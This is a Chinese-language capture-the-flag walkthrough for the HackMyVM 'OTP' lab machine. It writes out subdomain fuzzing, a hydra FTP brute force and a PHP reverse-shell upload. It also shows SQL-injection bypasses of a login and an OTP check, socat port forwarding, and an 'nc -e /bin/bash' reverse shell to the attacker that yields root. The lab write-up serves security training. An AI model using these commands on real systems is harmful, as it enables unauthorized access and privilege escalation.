<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/egMnf7FwBNhRgH9sLS6fzg)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 91篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvDiaSlVHOAlIlD39kHT0tnpJy6UZJUAia8T68xqg6jxx0eOXsXDdzibomnUNv63RtqsZ56Z4Cgo26rw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
==========================================================================================================================================================================

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=OTP  
网盘链接：https://pan.baidu.com/s/1OjMwuU6F1V98x2UnLz-eHA?pwd=xcvx
```

靶场: HackMyVm.eu

靶机名称: OTP

难度: 困难

发布时间: 2021年12月8日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
  
靶机:Vbox linux IP自动获取 网卡host-Only
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
fping -ag 10.0.0.0/24 2>/dev/null
```

扫描到主机地址为10.0.0.151

### 扫描端口

扫描靶机开放的服务端口

```
fscan -h 10.0.0.151
```

扫描到21和80端口开放，其中80端口跳转到了otp.hmv，需要绑定端口先来看看80端口

Web渗透
-----

绑定端口

```
sudo vi /etc/hosts
```

访问web

```
http://otp.hmv
```

访问后是Apahce的默认页面，来看看有哪些目录

```
dirsearch -u http://otp.hmv -w ~/HackTools/Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,html,txt -t 50
```

未扫描到可利用的信息，检查子域名

### 子域名暴破

```
ffuf -c -w ~/HackTools/Dict/SecLists-2022.1/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.otp.hmv' -u http://10.0.0.151 -fs 11202
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现子域名，绑定域名并访问

```
vi /etc/hosts
```

  

访问后在profile.html页面的源码中找到一些提示，用户otpuser密码#4ck!ng!s!nMybl0od，登录试试

登录后显示david，再没有其他提示了，尝试用david暴破ftp

```
hydra -l david -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.151
```

登录ftp

```
ftp 10.0.0.151
```

登录后找到一个文本文件，并且发现可以跳转目录。来看看哪些目录可以访问。

```
cd /var/www/otp/argon  
ls
```

在/var/www/otp/argon目录下发现u9l04d_目录有读写权限，上传个反弹shell脚本到目录下并执行。

1。攻击机监听4444端口

```
nc -lvvp 4444
```

2。ftp中上传shell.php

```
put shell.php
```

3。访问shell.php触发反弹

```
http://argon.otp.hmv/u9l04d_/shell.php
```

反弹成功，先切换到交互式shell，来找找可利用的信息。

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
Ctrl+z快捷键  
stty raw -echo;fg  
reset
```

```
cd /opt  
ls  
cat note4david.txt  
cat creds.sql
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在opt目录下找到2个文件，其中creds.sql数据库文件中找到一段字符串，疑似加密过的，尝试解密。

```
https://www.dcode.fr/identification-chiffrement
```

通过在线网站识别到是base32加密，解密后内容为n3v3rG0nn4G!v3y0UuP，猜测是一个密码。继续找。

```
cat /etc/passwd |grep bash
```

发现另一个可登录的普通权限用户avijneyam，继续查找。

```
sudo -l
```

这个用户名前加上!号还是第一次碰到，查了很多资料也没提示，感觉是说这个用户不能执行/bin/bash命令，目前只找到这些信息，刚刚在切换目录时发现/var/www/otp目录下还有一个totp目录，来看看是什么。

这个目录竟然没有访问权限，估计是其他用户身份的权限。

```
cd /etc/apache2/sites-available  
cat totp.conf
```

查看apache站点配置文件发现这个目录需要绑定域名，先绑定域名再业访问

```
sudo vi /etc/h
```

```
http://totp.otp.hmv/
```

访问后是一个登录页面，在这里并没有得到任何账号密码类的信息，尝试sql注入

```
' or 1=1 -- -
```

成功绕过，再次要求输入6位的OTP，

使用同样的注入方法再次绕过，在源码中看到一段payload内容，看着像是一个字典，去掉换行符后保存下来。

仔细看了下，内容全部是HackMyVm的靶机名。

还拿到一段字符串，其中一部分是*号显示，猜测这是avijneyam的账号密码信息需要补全，一共是19个星号和之前base32解码拿到的字符串相等，尝试补全切换到avijneyam用户。

```
avijneyam:n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_Only_4_y0u_:)
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换成功，先来找找flag

```
cd ~  
ls  
cat flag_user.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到flag_user.txt，再来找找可利用的信息。

```
sudo -l
```

发现可以使用root身份执行 /root/localhost.sh文件，来试试

```
sudo /bin/bash /root/localhost.sh
```

执行后在本地开启了一个5000端口的HTTP服务，想办法把端口映射到外部，按Ctrl+z快捷键转到后台

端口转发
----

```
socat tcp-listen:3333,fork tcp:127.0.0.1:5000 &
```

发现靶机已安装socat命令，使用此命令将本地的5000端口转发到3333端口上，再将刚刚5000端口服务转回前台

```
fg 1
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

现在可以访问5000端口了。

```
http://10.0.0.151:3333/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

没有可利用的信息，做个目录扫描

```
dirsearch -u http://10.0.0.151:3333 -w ~/HackTools/Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到SourceCode目录，访问看看

```
http://10.0.0.151:3333/SourceCode
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后看到一段base64编码后的内容，解码看看

```
curl http://10.0.0.151:3333/SourceCode | base64 -d
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这是一段python脚本使用了Flash框架，源码中可以看到需要我们发送json格式的数据，并提示我们需要一个正确的命令，尝试模糊测试反弹shell到攻击机上，在测试前还需要在攻击机上监听一个端口

```
ffuf -c  -u http://10.0.0.151:3333/ -X PUT -H 'Content-Type: application/json' -d '{"FUZZ": "nc -e /bin/bash 10.0.0.3 5555"}' -w ~/HackTools/Dict/SecLists-2022.1/Discovery/Web-Content/common.txt
```

更换了几个字典一直都未成功反弹shell，想起昨天还导出一个payloads.txt尝试用这个字典

```
ffuf -c -u http://10.0.0.151:3333/ -X PUT -H 'Content-Type: application/json' -d '{"FUZZ": "nc -e /bin/bash 10.0.0.3 5555"}' -w payloads.txt
```

反弹成功，拿到root权限，来找下flag

```
cd /root  
ls  
cat flag_r00t.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root.txt，游戏结束。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)